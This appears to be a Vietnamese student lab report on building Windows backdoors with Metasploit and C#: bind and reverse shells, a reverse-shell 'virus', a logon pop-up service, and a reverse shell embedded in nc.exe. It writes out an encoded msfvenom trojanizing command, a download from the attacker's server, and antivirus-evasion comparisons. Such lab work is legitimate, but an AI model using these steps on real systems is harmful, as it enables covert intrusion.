# **Tạo reverse shell bằng MSF và C#**

## Tạo payload windows/shell_bind_tcp

Trên máy tấn công (Kali Linux – **192.168.12.132**), tạo bind_shell với RHOST (IP máy nạn nhân – **192.168.12.133**) và LPORT (port lắng nghe trên máy tấn công – **4444**):

<img src="./media/image1.png" style="width:6.69375in;height:1.51667in" alt="Text Description automatically generated" />

Với bind_shell, nạn nhân phải chạy dịch vụ ngầm với file mà máy tấn công vừa tạo. Máy nạn nhân bật file vừa tạo từ máy tấn công:

<img src="./media/image2.png" style="width:6.69375in;height:2.97569in" alt="Text Description automatically generated" />

Kiểm tra port lắng nghe trên máy nạn nhân sau khi mở file từ máy attacker:

<img src="./media/image3.png" style="width:6.69375in;height:3.13333in" alt="A screenshot of a computer Description automatically generated" />

Lúc này, nạn nhân đã vô tình thiết lập kết nối qua cổng 4444 đến máy attacker. Trên máy attacker, sử dụng dịch vụ netcat để kết nối đến **192.168.12.133:4444** (IP của máy nạn nhân):

<img src="./media/image4.png" style="width:6.69375in;height:3.47361in" alt="Text Description automatically generated" />

## So sánh Non-Staged and Staged – Reverse TCP

-   **Tạo non-staged reverse tcp file bằng msfvenom:**

<img src="./media/image5.png" style="width:6.69375in;height:2.69444in" alt="Text Description automatically generated" />

Sau đó, ta bật msfconsole và set-up payload, LHOST, LPORT để lắng nghe:

<img src="./media/image6.png" style="width:6.69375in;height:1.4375in" alt="Graphical user interface, text, application Description automatically generated" />

Trên máy nạn nhân, tải tệp tin vừa tạo từ máy tấn công và mở file đó:

<img src="./media/image7.png" style="width:6.69375in;height:1.77778in" alt="Graphical user interface, text, application Description automatically generated" />

Ngay sau khi mở file, trên máy tấn công đã khởi động reverse_shell ngay lập tức và ta đã connect thành công đến máy victim:

<img src="./media/image8.png" style="width:6.69375in;height:3.30694in" alt="Text Description automatically generated" />

-   **Tạo staged reverse tcp trên máy tấn công:**

<img src="./media/image9.png" style="width:6.69375in;height:2.04722in" alt="Graphical user interface, text Description automatically generated" />

Trên máy nạn nhân, tải tệp malicious về. Trên máy tấn công, khởi động msfconsole và set-up thông tin cần thiết cho stage rev, sau đó, qua máy nạn nhân mở tệp vừa tải về. Thực hiện vài lần như vậy thì kết nối thành công đến shell của máy nạn nhân:

<img src="./media/image10.png" style="width:6.69375in;height:3.00903in" alt="Text Description automatically generated" />

### Kích thước payload

-   Non-staged rev tcp: **175174 bytes**

<img src="./media/image11.png" style="width:6.69375in;height:1.42708in" alt="Text Description automatically generated" />

-   Staged rev tcp: **354 bytes**

<img src="./media/image12.png" style="width:6.69375in;height:1.52569in" alt="Graphical user interface, text Description automatically generated" />

-   **Payload_size(STAGED) \< Payload_size(NON-STAGED)**

### Công cụ lắng nghe kết nối ngược lại

Cả hai đều có thể sử dụng **meterpreter** để lắng nghe kết nối:

-   Non-staged rev tcp thiết lập kết nối ngay lập tức khi máy nạn nhân mở tệp malicious

-   Staged rev tcp khi thiết lập kết nối dễ gây ra hiện tiếp ‘close session’ và chậm.

### Kiểm tra với phần mềm Anti-Virus

Đầu tiên, kiểm tra bằng Windows Defender trên Windows 7 không phát hiện ra gì:

-   **Non-staged:**

<img src="./media/image13.png" style="width:6.84931in;height:2.659in" alt="Graphical user interface, text, application Description automatically generated" />

-   **Stage**:

<img src="./media/image14.png" style="width:6.86009in;height:2.49167in" alt="Graphical user interface, application Description automatically generated" />

Sử dụng phần mềm Anti-Virus [Gridinsoft Anti-Malware](https://gridinsoft.com/antimalware) thì không thể phát hiện ra **Stage Rev TCP** file malicious:

<img src="./media/image15.png" style="width:6.86667in;height:3.20573in" alt="Graphical user interface, text, application, email Description automatically generated" />

## C# Virus đổi hình nền, kiểm tra Internet, tạo RevShell

### Thay đổi hình nền của máy nạn nhân

> Trong trường hợp dưới đây, ta sẽ tải 1 hình ảnh ở trên mạng về, sau đó thay đổi Wallpaper của máy nạn nhân rồi xoá ảnh vừa tải về đi.
>
> Ta sử dụng đoạn code sau:

<img src="./media/image16.png" style="width:6.88421in;height:2.725in" alt="Text Description automatically generated" />

Sau khi build ra con virus này ta chạy thử thì có thể thấy được kết quả như sau :

Đây là hình nên trước khi chạy.

<img src="./media/image17.png" style="width:6.85833in;height:3.85781in" alt="Background pattern Description automatically generated" />

Hình ảnh trong khi chạy virus.

<img src="./media/image18.png" style="width:6.64167in;height:3.73594in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

Sau khi thay đổi Wallpaper và xoá file Wall.jpg mới tải về xong.

<img src="./media/image19.png" style="width:6.60741in;height:3.71667in" alt="A picture containing text, snow, sky, mountain Description automatically generated" />

### Kiểm tra kết nối Internet, tải và thực thi reverse shell

Đầu tiên ta viết hàm kiểm tra Internet của máy nạn nhân như sau: Ta sử dụng lệnh ping tới google để xác định xem có Internet hay không.

<img src="./media/image20.png" style="width:5in;height:2.9375in" alt="Text Description automatically generated" />

Ta viết hàm reverse shell đơn giản như sau: Ta sẽ kết nối tới 1 địa chỉ IP bằng port 6666.

<img src="./media/image21.png" style="width:6.01667in;height:3.91083in" alt="Text Description automatically generated" />

<img src="./media/image22.png" style="width:6.05in;height:2.53344in" alt="Text Description automatically generated" />

Đây là hàm tạo ra 1 file và ghi 1 tin nhắn bất kỳ vào máy nạn nhân.

<img src="./media/image23.png" style="width:6.075in;height:2.94891in" alt="Text Description automatically generated" />

Đầu tiên ta dung IP của hacker vào con Virus (ví dụ). Sau đó mở sẵn port 6666 chờ phản hồi từ virus.

<img src="./media/image24.png" style="width:5.45833in;height:3.17266in" alt="Text Description automatically generated" />

Virus sẽ chạy như sau:

<img src="./media/image25.png" style="width:5.4978in;height:2.6in" alt="Text Description automatically generated" />

Khi có mạng ta thấy được máy hacker đã kết nối được với máy của nạn nhân.

<img src="./media/image26.png" style="width:6.63473in;height:2.30833in" alt="Graphical user interface, text Description automatically generated" />

Khi không có mạng thì virus tự tạo ra 1 file tên DatNLQ.txt và khi vào nội dung *“I’m hackermannn”*

<img src="./media/image27.png" style="width:6.70833in;height:3.63368in" alt="A screenshot of a computer Description automatically generated" />

<img src="./media/image28.png" style="width:6.725in;height:2.39578in" alt="Graphical user interface, text Description automatically generated with medium confidence" />

## C# Virus hiển thị pop-up MSSV khi đăng nhập

Để hiển thị pop-up với Windows Service, ta sử dụng thư viện **wtsapi32.h** để tận dụng [WTSSendMessageA](https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtssendmessagea) hiển thị MessageBox pop-up:

<img src="./media/image29.png" style="width:6.69375in;height:3.0625in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

Ta sử dụng DllImport để add wtsapi32.h vào sources:

\[DllImport("wtsapi32.dll", SetLastError = true)\]

static extern void WTSSendMessage(

IntPtr hServer,

\[MarshalAs(UnmanagedType.I4)\] int SessionId, //current user ss id

String pTitle, //title in msgbox

\[MarshalAs(UnmanagedType.U4)\] int TitleLength, //length of title

String pMessage, //message in msgbox

\[MarshalAs(UnmanagedType.U4)\] int MessageLength, //length of message

\[MarshalAs(UnmanagedType.U4)\] int Style, //style of msgbox

\[MarshalAs(UnmanagedType.U4)\] int Timeout, //timeout of msgbox

\[MarshalAs(UnmanagedType.U4)\] out int pResponse, //res of user

bool bWait

);

Tiếp theo, sử dụng event OnSessionChange để check session behavior của User. Tiếp đó, vì không biết cụ thể session id của mỗi lần log on, do đó, dựa vào tính chất của các session id của user lúc log on (thường là nhỏ từ 0 -\> 9), ta thực hiện chạy vòng lặp:

<img src="./media/image30.png" style="width:6.69375in;height:2.6in" alt="Text Description automatically generated" />

Ở phần setting, ta chọn ServiceStartMode.Automatic để service tự mở và khởi tạo. Sau đó, bật service lên:

<img src="./media/image31.png" style="width:6.69375in;height:3.86806in" alt="Graphical user interface, application Description automatically generated" />

Sign out khỏi account:

<img src="./media/image32.png" style="width:6.69375in;height:3.76528in" alt="Calendar Description automatically generated" />

Login lại account:

<img src="./media/image33.png" style="width:6.32875in;height:3.55996in" alt="A screenshot of a computer Description automatically generated" />

<img src="./media/image34.png" style="width:6.3295in;height:3.56038in" alt="A screenshot of a computer Description automatically generated" />

## So sánh viết C# Virus và MSF Virus

Viết virus bằng C# sẽ cho ra con virus chất lượng hơn do người viết có thể chủ động và tạo ra content của virus theo tùy từng mục đích và kiểm soát được từng hành động của virus dựa vào chủ đích của người viết. Virus dịch vụ C# sẽ khó bị phát hiện một khi đã được cài vào máy của nạn nhân.

Viết virus bằng MSF sẽ cho ra một con virus nhanh chóng, mang tính “phổ quát” hơn với các chức năng theo mục đích của người viết. Tuy vậy, virus MSF dễ dàng bị các phần mềm anti-virus quét và reject.

Tóm lại, tùy từng mục đích (nhanh – chậm, chống chọi tốt – yếu) mà ta cần chọn viết loại nào thích hợp.

2.  # **2 Nhúng reverse shell vào tập tin**

    1.  ## Thực hiện nhúng reverse shell vào tập tin nc.exe 

> Kiểm tra vị trí của file PE **nc.exe**

<img src="./media/image35.png" style="width:4.57487in;height:0.85218in" alt="Text Description automatically generated" />

Kiểm tra ip của máy tấn công:

<img src="./media/image36.png" style="width:5.9828in;height:1.30075in" alt="Text Description automatically generated" />

> Thực hiện tạo và nhúng payload vào tập tin **nc.exe***:*

<img src="./media/image37.png" style="width:6.85439in;height:2.05119in" alt="Text Description automatically generated" />

Câu lệnh tạo và nhúng payload vào tập tin **whoami.exe***:*

*msfvenom -p windows/shell_reverse_tcp LHOST=192.168.181.128 LPORT=4444 EXITFUNC=thread -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/nc.exe -o shell_reverse_embedded_1.exe*

File **shell_reverse_embedded.exe_1** được tạo ra thành công.

<img src="./media/image38.png" style="width:6.82077in;height:0.5254in" />

Thực hiện sử dụng module multi/hander của MSF để thực hiện lắng nghe connect back

<img src="./media/image39.png" style="width:6.12586in;height:2.26073in" alt="Text Description automatically generated" />

Chuyển file PE có nhúng mã độc vào và khởi chạy dịch vụ web:

<img src="./media/image40.png" style="width:6.15687in;height:0.82704in" alt="Text Description automatically generated" />

<img src="./media/image41.png" style="width:6.18153in;height:2.09221in" alt="Text Description automatically generated" />

Ở máy nạn nhân window 7, tiến hành truy cập: [*http://192.168.181.128/shell_reverse_embedded_1.exe*](http://192.168.181.128/shell_reverse_embedded_1.exe) để download mã độc về.

<img src="./media/image42.png" style="width:6.5in;height:1.49097in" alt="Graphical user interface, text, application, email, Teams Description automatically generated" />

Tiến hành khởi chạy ở máy nạn nhân

<img src="./media/image43.png" style="width:6.5in;height:4.03472in" alt="A screenshot of a computer Description automatically generated" />

Ở máy tấn công đã thành công kiểm soát được máy nạn nhân:

<img src="./media/image44.png" style="width:6.5in;height:2.68611in" alt="Text Description automatically generated" />

## So sánh nhúng payload vào tập tin có sẵn và tạo payload mới:

**Khác nhau**:

-   Nhúng payload vào tập tin có sẵn:

<!-- -->

-   Che dấu tốt hơn

-   Phải đảm bảo size và chức năng của chương trình cũ

-   Có khả năng không được thực hiện nếu chương trình gốc không được thực thi

<!-- -->

-   Tạo payload mới:

<!-- -->

-   Không có tính che dấu, dễ bị phát hiện

-   Tuy nhiên việc tạo ra lại nhanh hơn

-   Không cần tìm kiếm tập tin phù hợp để nhúng vào

**Giống nhau**: Đều nhằm mục đích chiếm quyền kiểm soát máy nạn nhân (do dùng chung payload).
